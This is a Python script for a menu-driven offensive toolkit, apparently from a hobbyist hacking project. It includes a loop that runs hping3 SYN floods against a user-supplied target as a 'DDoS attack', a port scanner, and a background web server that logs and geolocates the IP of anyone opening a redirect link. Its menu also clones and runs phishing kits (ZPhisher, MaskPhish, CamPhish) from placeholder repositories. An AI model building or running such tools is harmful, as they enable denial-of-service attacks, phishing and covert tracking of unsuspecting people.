#!/usr/bin/env python3
import subprocess
import os
import time
import shutil
import socket
import requests
import json
import ipaddress
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse
from colorama import Fore, Style, init
import threading

# Initialize colorama
init()

def clear_console(except_art=False):
    if not except_art:
        os.system('clear')  # Clear the console

def center_text(text):
    terminal_width = shutil.get_terminal_size().columns
    centered_lines = [line.center(terminal_width) for line in text.strip().split('\n')]
    return "\n".join(centered_lines)

def print_centered(text):
    print(center_text(Fore.RED + text + Style.RESET_ALL))

# ASCII Art Logo
logo = """
┳┳┓┏┓┏┓┏┓┏┓  ┏┓┓ ┳┏┓┳┓┏┳┓
┃┃┃┏┛┏┛┏┛┃┃  ┃ ┃ ┃┣ ┃┃ ┃ 
  ┛ ┗┗┛┗┛┗┛┗┻  ┗┛┗┛┻┗┛┛┗ ┻ v2
created by mdalam-4986
and iamgeo1
"""

# Function to clone and run a git repository
def clone_and_run(repo_url, dir_name):
    if not os.path.exists(dir_name):
        print_centered(f"Cloning {repo_url}...")
        subprocess.run(['git', 'clone', repo_url])
    
    os.chdir(dir_name)
    # Assuming there's a start.sh or similar script to run the tool
    if os.path.isfile('start.sh'):
        subprocess.run(['bash', 'start.sh'])
    else:
        print_centered("No start.sh file found. Please check the repository.")
    os.chdir('..')  # Change back to the original directory

# DDoS Functionality
def ddos_function():
    clear_console()
    ddos_art = """
┳┓┳┓  ┏┓  ┏┓┏┳┓┏┳┓┏┓┏┓┓┏┓
┃┃┃┃┏┓┗┓  ┣┫ ┃  ┃ ┣┫┃ ┃┫ 
┻┛┻┛┗┛┗┛  ┛┗ ┻  ┻ ┛┗┗┛┛┗┛
    """
    print_centered(ddos_art)
    target_ip = input(Fore.RED + "Target IP: " + Style.RESET_ALL)
    duration = int(input(Fore.YELLOW + "Duration in seconds: " + Style.RESET_ALL))

    print_centered("Starting DDoS attack...")
    end_time = time.time() + duration

    while time.time() < end_time:
        subprocess.run(['hping3', '--flood', '-S', target_ip])
    print_centered("DDoS attack finished.")
    wait_for_user()

# Port Scanner Functionality
def port_scanner():
    clear_console()
    port_scanner_art = """
┏┓┏┓┳┓┏┳┓  ┏┓┏┓┏┓┳┓┳┓┏┓┳┓
┃┃┃┃┣┫ ┃   ┗┓┃ ┣┫┃┃┃┃┣ ┣┫
┣┛┗┛┛┗ ┻   ┗┛┗┛┛┗┛┗┛┗┗┛┛┗
    """
    print_centered(port_scanner_art)
    print(Fore.LIGHTGREEN_EX + "Port Scanner" + Style.RESET_ALL)
    
    target_ip = input(Fore.RED + "Target IP: " + Style.RESET_ALL)
    start_port = int(input(Fore.YELLOW + "Start Port: " + Style.RESET_ALL))
    end_port = int(input(Fore.YELLOW + "End Port: " + Style.RESET_ALL))

    for port in range(start_port, end_port + 1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)

        result = sock.connect_ex((target_ip, port))
        
        if result == 0:
            print(Fore.GREEN + f"Port {port} is open" + Style.RESET_ALL)
        else:
            print(Fore.RED + f"Port {port} is closed" + Style.RESET_ALL)
        
        sock.close()

    wait_for_user()

# Class to handle IP Toolkit functionality
class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urlparse(self.path)
        if parsed_path.path.startswith('/redirect/'):
            user_ip = self.client_address[0]
            print(f"Redirecting {user_ip}...")
            geolocation_info = self.get_geolocation(user_ip)
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            response_html = f"""
            <html>
                <body>
                    <h1>Your IP: {user_ip}</h1>
                    <h2>Geolocation Information:</h2>
                    <pre>{geolocation_info}</pre>
                    <h3>Redirecting to: {parsed_path.path[10:]}</h3>
                </body>
            </html>
            """
            self.wfile.write(response_html.encode())
            self.send_response(302)
            self.send_header('Location', parsed_path.path[10:])
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

    def get_geolocation(self, ip):
        try:
            ip_obj = ipaddress.ip_address(ip)
            if ip_obj.is_private:
                return "Local IP addresses do not have geolocation information."
            else:
                response = requests.get(f"https://ipinfo.io/{ip}/json")
                data = response.json()
                formatted_data = json.dumps(data, indent=4)
                return formatted_data
        except Exception as e:
            return f"Failed to retrieve geolocation information: {str(e)}"

def run_server(port=8000):
    server_address = ('', port)
    httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
    httpd.serve_forever()

def start_server_thread():
    server_thread = threading.Thread(target=run_server, args=(8000,))
    server_thread.daemon = True
    server_thread.start()

class IPToolkit:
    def __init__(self, max_entries=5):
        self.max_entries = max_entries
        self.latest_info = []

    def add_latest_info(self, info):
        if len(self.latest_info) >= self.max_entries:
            self.latest_info.pop(0)
        self.latest_info.append(info)

    def get_latest_info(self):
        return "\n".join(self.latest_info) if self.latest_info else "No recent information available."

    def get_local_ip(self):
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        self.add_latest_info(f"Local IP Address: {local_ip}")
        return local_ip

    def get_public_ip(self):
        try:
            response = requests.get('https://api.ipify.org?format=json')
            public_ip = response.json()['ip']
            self.add_latest_info(f"Public IP Address: {public_ip}")
            return public_ip
        except Exception as e:
            self.add_latest_info(f"Failed to retrieve public IP: {str(e)}")
            return None

    def ip_geolocation(self, ip):
        try:
            ip_obj = ipaddress.ip_address(ip)
            if ip_obj.is_private:
                message = "Local IP addresses do not have geolocation information available."
                self.add_latest_info(message)
                return json.dumps({"IP": str(ip_obj), "Message": message}, indent=4)
            else:
                response = requests.get(f"https://ipinfo.io/{ip}/json")
                data = response.json()
                address = data.get('hostname', 'Unknown') + ', ' + data.get('city', 'Unknown') + ', ' + data.get('region', 'Unknown') + ', ' + data.get('country', 'Unknown')
                formatted_data = {
                    "IP": ip,
                    "Hostname": data.get('hostname', 'N/A'),
                    "City": data.get('city', 'N/A'),
                    "Region": data.get('region', 'N/A'),
                    "Country": data.get('country', 'N/A'),
                    "Location": data.get('loc', 'N/A'),
                    "Postal": data.get('postal', 'N/A'),
                    "Address": address
                }
                self.add_latest_info(f"Geolocation Information for {ip}: {formatted_data}")
                return json.dumps(formatted_data, indent=4)
        except Exception as e:
            message = f"Failed to retrieve geolocation information: {str(e)}"
            self.add_latest_info(message)
            return json.dumps({"Error": message}, indent=4)

def wait_for_user():
    input(Fore.RED + "Press Enter to continue..." + Style.RESET_ALL)

def main_menu():
    clear_console()
    print_centered(logo)
    
    while True:
        print_centered("Select an option:")
        print_centered("1. IP Toolkit")
        print_centered("2. MaskPhish")
        print_centered("3. ZPhisher")
        print_centered("4. CamPhish")
        print_centered("5. DDoS Attack")
        print_centered("6. Port Scanner")
        print_centered("7. Exit")

        choice = input(Fore.RED + "Enter choice: " + Style.RESET_ALL)

        if choice == "1":
            toolkit = IPToolkit()
            print_centered("Local IP: " + toolkit.get_local_ip())
            print_centered("Public IP: " + toolkit.get_public_ip())
            ip_to_geo = input(Fore.RED + "Enter IP to get geolocation: " + Style.RESET_ALL)
            print_centered("Geolocation Info: " + toolkit.ip_geolocation(ip_to_geo))

        elif choice == "2":
            clone_and_run("https://github.com/yourusername/maskphish.git", "maskphish")

        elif choice == "3":
            clone_and_run("https://github.com/yourusername/zphisher.git", "zphisher")

        elif choice == "4":
            clone_and_run("https://github.com/yourusername/camphish.git", "camphish")

        elif choice == "5":
            ddos_function()

        elif choice == "6":
            port_scanner()

        elif choice == "7":
            print_centered("Exiting...")
            break

        else:
            print_centered("Invalid choice. Please try again.")

if __name__ == "__main__":
    start_server_thread()  # Start the HTTP server
    main_menu()

